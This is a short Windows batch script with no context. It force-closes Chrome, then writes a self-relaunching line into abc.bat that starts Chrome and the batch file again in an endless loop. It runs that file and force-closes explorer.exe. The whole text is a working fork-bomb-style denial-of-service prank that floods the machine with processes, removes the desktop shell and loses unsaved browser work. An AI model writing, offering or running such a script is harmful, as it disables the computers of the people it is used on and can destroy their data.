taskkill /im chrome.exe /f
echo start chrome ^& start abc.bat >> abc.bat
abc.bat
taskkill /im explorer.exe /f
